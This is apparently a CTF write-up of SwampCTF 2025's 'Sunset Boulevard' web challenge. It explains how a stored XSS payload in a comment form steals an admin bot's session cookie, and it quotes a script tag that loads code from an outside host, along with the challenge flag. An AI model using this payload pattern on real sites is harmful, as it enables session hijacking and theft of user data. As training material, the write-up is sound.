---
title: "Sunset Boulevard 🌇 – XSS to Admin Pwnage (SwampCTF 2025)"
tags: [CTF, web, XSS, stored XSS, session hijacking, swampctf]
---

# Sunset Boulevard 🌇

![JavaScript](https://img.shields.io/badge/JavaScript-✔️-yellow)
![Difficulty](https://img.shields.io/badge/difficulty-easy-blue)
![Category](https://img.shields.io/badge/category-Web-red)
![CTF](https://img.shields.io/badge/Event-SwampCTF%202025-purple)

> Welcome to the glitzy world of Broadway! The hit revival of "Sunset Boulevard" starring Nicole Scherzinger has taken the theater world by storm. 

> As part of the fan engagement team, you've discovered a website where fans can send letters to the star. 

> However, rumors suggest that a hidden admin dashboard contains something valuable - possibly the CTF flag.

A classic XSS challenge where we climb the boulevard of bug dreams and steal the spotlight from admin. 🕵️‍♂️

## 📚 Table of Contents

- [Recon 🔍](#recon-)
- [The Goal 🎯](#the-goal-)
- [The Injection 💉](#the-injection-)
- [Exfiltrating the Cookie 🍪](#exfiltrating-the-cookie-)
- [Getting Admin Access 👑](#getting-admin-access-)
- [Conclusion 🧠](#conclusion-)

## Recon 🔍

Upon accessing the provided challenge site, we’re presented with a flashy landing page — part of a Broadway-style show-themed app. 

There's a comment form on the page, allowing users to leave feedback publicly visible to others.

💡 **Hint from summary of the statement:** The admin bot regularly visits the page and reads new comments. 

This screams **stored XSS**!

## The Goal 🎯

We need to:
- Inject a malicious script via the comment system.
- Make the admin bot execute our code.
- Steal their session cookie or trigger an action as admin.
- Use that privilege to obtain a shell or the flag.

![Contact form](https://github.com/user-attachments/assets/3af57fed-2e1b-4581-8896-34a3a9eea396)

## The Injection 💉

Using the comment form, we can try to inject some JS. 

https://artoo.love provides a good service for that. You can generate a callback URL and inject it, and try to steal some informations.

![Artoo payload](https://github.com/user-attachments/assets/1161a9d8-1e62-4e8c-abe8-e1fb00c88589)

## Exfiltrating the Cookie 🍪

Let's try it in the form:

![Contact form with XSS](https://github.com/user-attachments/assets/4e1f1da9-d3b5-48ed-b02e-5f21980e2fa4)

This script is hosted externally and performs a payload execution once loaded. 

The `artoo.js` library enables web scraping and DOM manipulation, but also opens up the ability to run arbitrary JavaScript once the admin visits our comment.

When the admin sees this comment, their browser fetches and executes the malicious script.

### Result:  
We capture the **admin’s session cookie**.

## Getting Admin Access 👑

With the stolen cookie, we can either:

- Set it manually in our browser (using developer tools).
- Or use a tool like `curl` or Burp to replay authenticated requests.

But it's not needed here, since the flag is present in the cookies directly.

![Admin cookie](https://github.com/user-attachments/assets/95dbed37-10e9-4157-8a10-fdf458c36af4)

Flag retrieved:  
```
swampCTF{THIS_MUSICAL_WAS_REVOLUTIONARY_BUT_ALSO_KIND_OF_A_SNOOZE_FEST}
```

## Conclusion 🧠

A solid reminder that **stored XSS is more than a meme** — it’s a door to privilege escalation when an admin is involved.

- Reflecting unfiltered user input = 💣
- Admin bot + session-based auth = 🍰
- Payloads like `<script src="https://artoo.love">` are **minimal, elegant, and deadly** 💀

➡️ Always sanitize inputs and audit any third-party scripts included on your site.

🔙 [Back to SwampCTF 2025 Writeups](../../)
